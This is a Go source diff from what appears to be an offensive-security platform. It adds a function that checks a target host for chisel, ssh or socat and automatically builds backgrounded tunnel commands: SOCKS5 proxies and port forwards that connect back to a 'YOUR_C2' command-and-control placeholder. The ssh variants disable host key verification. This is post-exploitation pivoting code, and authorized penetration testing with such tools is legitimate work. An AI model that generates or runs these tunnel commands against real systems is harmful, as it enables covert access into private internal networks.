@@ -14,9 +14,9 @@ import (
 	"strings"
 	"time"
 
-	"github.com/Autumn-27/artex/db"
-	"github.com/Autumn-27/artex/guard"
-	"github.com/Autumn-27/artex/scanner"
+	"github.com/Autumn-27/jingwei/db"
+	"github.com/Autumn-27/jingwei/guard"
+	"github.com/Autumn-27/jingwei/scanner"
 )
 
 // ---------------------------------------------------------------------------
@@ -347,6 +347,62 @@ func intranetHasBin(info intranetProbeInfo, name string) bool {
 	return false
 }
 
+// autoSelectTunnelCommand picks the best deployment command based on what tools
+// are available on the target. 隧道自动选型：目标上有什么就用什么，优先选
+// 功能最强的工具（chisel > ssh > socat），而不是让操作员自己猜。
+func autoSelectTunnelCommand(kind string, info intranetProbeInfo, t *db.IntranetTunnel) (deploy, reason string) {
+	listenPort := t.ListenPort
+	remoteHost := t.RemoteHost
+	remotePort := t.RemotePort
+	tunnelID := strconv.FormatInt(t.ID, 10)
+
+	switch kind {
+	case db.IntranetTunnelKindSocks5:
+		// SOCKS5: chisel > ssh -D > socat(端口转发降级)
+		if intranetHasBin(info, "chisel") {
+			// chisel client → server SOCKS5
+			deploy = fmt.Sprintf("nohup chisel client --fingerprint auto %s:8788 sock > /tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
+				"YOUR_C2", tunnelID)
+			reason = "目标有 chisel，用 chisel client 建 SOCKS5"
+		} else if intranetHasBin(info, "ssh") && listenPort > 0 {
+			deploy = fmt.Sprintf("nohup ssh -N -D 0.0.0.0:%d -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s > /tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
+				listenPort, "YOUR_C2", tunnelID)
+			reason = "目标有 ssh，用 ssh -D 建 SOCKS5"
+		} else {
+			return "", "目标上没有 chisel/ssh，无法自动建 SOCKS5；请手动提供 deploy_command"
+		}
+		return deploy, reason
+
+	case db.IntranetTunnelKindPort, db.IntranetTunnelKindRemote:
+		// 端口转发：socat > ssh -L > chisel
+		if remoteHost == "" || remotePort <= 0 || listenPort <= 0 {
+			return "", "需要 listen_port、remote_host 与 remote_port"
+		}
+		if intranetHasBin(info, "socat") {
+			listen := "TCP-LISTEN:" + strconv.Itoa(listenPort)
+			if h := strings.TrimSpace(t.ListenHost); h != "" && h != "0.0.0.0" && h != "::" {
+				listen += ",bind=" + h
+			}
+			listen += ",fork,reuseaddr"
+			base := "socat " + listen + " TCP:" + intranetHostPort(remoteHost, remotePort)
+			deploy = "nohup " + base + " </dev/null >/tmp/jw_tunnel_" + tunnelID + ".log 2>&1 & echo JW_PID:$!"
+			reason = "目标有 socat，用 socat 做端口转发"
+		} else if intranetHasBin(info, "ssh") {
+			deploy = fmt.Sprintf("nohup ssh -N -L %d:%s:%d -o StrictHostKeyChecking=no %s > /tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
+				listenPort, remoteHost, remotePort, "YOUR_C2", tunnelID)
+			reason = "目标没有 socat，用 ssh -L 做端口转发"
+		} else if intranetHasBin(info, "chisel") {
+			deploy = fmt.Sprintf("nohup chisel client --fingerprint auto %s:8788 R:%d:%s:%d > /tmp/jw_tunnel_%s.log 2>&1 & echo JW_PID:$!",
+				"YOUR_C2", listenPort, remoteHost, remotePort, tunnelID)
+			reason = "目标没有 socat/ssh，用 chisel 做端口转发"
+		} else {
+			return "", "目标上没有 socat/ssh/chisel，无法自动生成转发命令；请手动提供 deploy_command"
+		}
+		return deploy, reason
+	}
+	return "", "不支持的隧道类型: " + kind
+}
+
 func intranetVerifyCommand(port int) string {
 	return "(ss -lnt 2>/dev/null || netstat -lnt 2>/dev/null) | grep -qE '[:.]" + strconv.Itoa(port) + "[[:space:]]' && echo JW_TUNNEL_OK || echo JW_TUNNEL_FAIL"
 }
@@ -383,26 +439,14 @@ func (s *Server) intranetPlanTunnel(ctx context.Context, pg *db.DB, t *db.Intran
 		teardown = strings.TrimSpace(t.TeardownCommand)
 	}
 	if deploy == "" {
-		switch t.Kind {
-		case db.IntranetTunnelKindPort, db.IntranetTunnelKindRemote:
-			if t.RemoteHost == "" || t.RemotePort <= 0 || t.ListenPort <= 0 {
-				return nil, info, errors.New("需要 listen_port、remote_host 与 remote_port")
-			}
-			if !intranetHasBin(info, "socat") {
-				return nil, info, errors.New("目标上没有 socat，无法自动生成转发命令；请手动提供 deploy_command")
-			}
-			listen := "TCP-LISTEN:" + strconv.Itoa(t.ListenPort)
-			if h := strings.TrimSpace(t.ListenHost); h != "" && h != "0.0.0.0" && h != "::" {
-				listen += ",bind=" + h
-			}
-			listen += ",fork,reuseaddr"
-			base := "socat " + listen + " TCP:" + intranetHostPort(t.RemoteHost, t.RemotePort)
-			deploy = "nohup " + base + " </dev/null >/tmp/jw_tunnel_" + strconv.FormatInt(t.ID, 10) + ".log 2>&1 & echo JW_PID:$!"
-		case db.IntranetTunnelKindSocks5:
-			return nil, info, errors.New("SOCKS5 需要为目标手动指定 deploy_command（例如 chisel/frp/ssh -D 命令）；平台只在端口转发时自动生成命令")
-		default:
-			return nil, info, errors.New("不支持的隧道类型: " + t.Kind)
+		// 隧道自动选型：根据目标上可用的工具自动选择最佳部署命令
+		autoDeploy, reason := autoSelectTunnelCommand(t.Kind, info, t)
+		if autoDeploy == "" {
+			return nil, info, errors.New(reason)
 		}
+		deploy = autoDeploy
+		_ = pg.AddIntranetSessionEvent(sess.ID, "tunnel",
+			"自动选型："+reason, autoDeploy, false)
 	}
 	if verify == "" {
 		if t.ListenPort > 0 {
